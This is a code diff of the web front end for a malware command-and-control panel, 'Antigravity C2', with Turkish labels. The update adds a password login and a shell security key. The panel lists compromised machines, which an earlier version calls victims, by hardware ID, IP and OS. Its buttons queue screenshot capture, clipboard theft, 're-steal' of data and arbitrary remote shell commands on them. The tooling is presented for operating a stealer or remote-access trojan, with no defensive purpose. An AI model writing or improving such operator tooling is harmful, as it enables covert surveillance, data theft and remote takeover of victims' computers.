@@ -1,91 +1,171 @@
 <!DOCTYPE html>
 <html lang="tr">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Antigravity C2 Panel</title>
+    <title>Antigravity C2 Secure Panel</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
-        .container { max-width: 1000px; margin: auto; }
-        header { border-bottom: 2px solid #1e293b; padding-bottom: 20px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; }
-        h1 { margin: 0; color: #38bdf8; }
-        .client-card { background: #1e293b; border-radius: 12px; padding: 20px; margin-bottom: 15px; border: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
-        .client-card:hover { border-color: #38bdf8; }
-        .client-info b { color: #38bdf8; }
-        .status-online { color: #4ade80; font-size: 0.8em; }
-        .status-offline { color: #fb7185; font-size: 0.8em; }
-        .btn-group { display: flex; gap: 10px; }
-        button { background: #0369a1; color: white; border: none; padding: 8px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
-        button:hover { background: #0ea5e9; }
-        button.danger { background: #be123c; }
-        button.danger:hover { background: #e11d48; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0b0e14;
+            color: #adbac7;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1100px;
+            background: #161b22;
+            padding: 30px;
+            border-radius: 16px;
+            border: 1px solid #30363d;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        #login-screen {
+            text-align: center;
+        }
+
+        #main-content {
+            display: none;
+        }
+
+        input {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 10px 0;
+            width: 250px;
+        }
+
+        button {
+            background: #316dca;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            margin: 5px;
+            transition: 0.2s;
+        }
+
+        button:hover {
+            background: #448cf2;
+        }
+
+        .client-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .status-online {
+            color: #57ab5a;
+        }
+
+        .status-offline {
+            color: #f47067;
+        }
+
+        .badge {
+            background: #2d333b;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.8em;
+        }
     </style>
 </head>
-<body>
-    <div class="container">
-        <header>
-            <h1>🛡️ Antigravity C2 Terminal</h1>
-            <div id="stats">Checking connections...</div>
-        </header>
 
-        <div id="client-list">
-            <!-- JavaScript ile dolacak -->
+<body>
+    <!-- LOGIN SCREEN -->
+    <div id="login-screen" class="container" style="max-width: 400px;">
+        <h2>🛡️ Secure Login</h2>
+        <input type="password" id="panel-pass" placeholder="Panel Şifresi">
+        <br>
+        <button onclick="doLogin()">Giriş Yap</button>
+    </div>
+
+    <!-- MAIN DASHBOARD -->
+    <div id="main-content" class="container">
+        <div
+            style="display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #30363d; padding-bottom: 15px; margin-bottom: 20px;">
+            <h1 style="color: #539bf5; margin:0;">🛰️ Operator Terminal</h1>
+            <button onclick="location.reload()" style="background:#2d333b">Çıkış</button>
         </div>
+        <div id="client-list"></div>
     </div>
 
     <script>
+        let sessionToken = "";
+
+        async function doLogin() {
+            const pass = document.getElementById('panel-pass').value;
+            const resp = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: pass })
+            });
+            if (resp.ok) {
+                const data = await resp.json();
+                sessionToken = data.token;
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
+                fetchClients();
+                setInterval(fetchClients, 5000);
+            } else {
+                alert("Erişim Reddedildi!");
+            }
+        }
+
         async function fetchClients() {
-            try {
-                const response = await fetch('/api/clients');
-                const clients = await response.json();
-                const listDiv = document.getElementById('client-list');
-                const statsDiv = document.getElementById('stats');
-                
-                let html = '';
-                let onlineCount = 0;
+            const resp = await fetch('/api/clients');
+            const clients = await resp.json();
+            const listDiv = document.getElementById('client-list');
 
-                for (const [hwid, data] of Object.entries(clients)) {
-                    if (data.status === 'online') onlineCount++;
-                    html += `
-                        <div class="client-card">
-                            <div class="client-info">
-                                <div><b>HWID:</b> ${hwid}</div>
-                                <div><b>IP:</b> ${data.ip} | <b>OS:</b> ${data.os}</div>
-                                <div class="${data.status === 'online' ? 'status-online' : 'status-offline'}">
-                                    ● ${data.status.toUpperCase()}
-                                </div>
-                            </div>
-                            <div class="btn-group">
-                                <button onclick="sendCommand('${hwid}', 'GET_SS')">📸 Get SS</button>
-                                <button onclick="sendCommand('${hwid}', 'GET_CLIP')">📋 Clipboard</button>
-                                <button onclick="sendCommand('${hwid}', 'RE_STEAL')">🔁 Re-Steal</button>
-                                <button class="danger" onclick="sendShell('${hwid}')">🐚 Shell</button>
-                            </div>
-                        </div>
-                    `;
-                }
-                listDiv.innerHTML = html || '<p style="text-align:center; opacity:0.5;">Henüz bağlı kurban yok...</p>';
-                statsDiv.innerHTML = `Connected: ${onlineCount} active clients`;
-            } catch (e) {
-                console.error("Fetch error:", e);
+            listDiv.innerHTML = clients.map(c => `
+                <div class="client-row">
+                    <div>
+                        <b style="color:#539bf5; font-size:1.2em;">${c.id}</b> 
+                        <span class="badge">${c.os}</span>
+                        <div style="font-size:0.8em; margin-top:5px; opacity:0.6;">Son Görülme: ${c.last_seen_str}</div>
+                    </div>
+                    <div class="${c.status === 'online' ? 'status-online' : 'status-offline'}">
+                        ● ${c.status.toUpperCase()}
+                    </div>
+                    <div>
+                        <button onclick="sendCmd('${c.id}', 'GET_SS')">📸 Ekran</button>
+                        <button onclick="sendCmd('${c.id}', 'GET_CLIP')">📋 Pano</button>
+                        <button style="background:#be123c" onclick="sendShell('${c.id}')">🐚 Shell</button>
+                    </div>
+                </div>
+            `).join('') || '<p style="text-align:center; opacity:0.5;">Bağlı cihaz yok...</p>';
+        }
+
+        async function sendCmd(id, cmd) {
+            await fetch(`/api/command/${id}/${cmd}`, { method: 'POST' });
+            alert("Komut sıraya alındı.");
+        }
+
+        async function sendShell(id) {
+            const key = prompt("Shell Güvenlik Anahtarı:");
+            if (!key) return;
+            const shell = prompt("Çalıştırılacak Komut:");
+            if (shell) {
+                const resp = await fetch(`/api/command/${id}/SHELL:${shell}?key=${key}`, { method: 'POST' });
+                if (resp.status === 403) alert("Hatalı Güvenlik Anahtarı!");
+                else alert("Shell komutu gönderildi.");
             }
         }
-
-        async function sendCommand(hwid, cmd) {
-            await fetch(`/api/command/${hwid}/${cmd}`, { method: 'POST' });
-            alert(`Komut Gönderildi: ${cmd}`);
-        }
-
-        async function sendShell(hwid) {
-            const cmd = prompt("Çalıştırılacak Shell Komutu:");
-            if (cmd) {
-                await fetch(`/api/command/${hwid}/SHELL:${cmd}`, { method: 'POST' });
-                alert("Shell komutu sıraya alındı.");
-            }
-        }
-
-        setInterval(fetchClients, 5000);
-        fetchClients();
     </script>
 </body>
+
 </html>
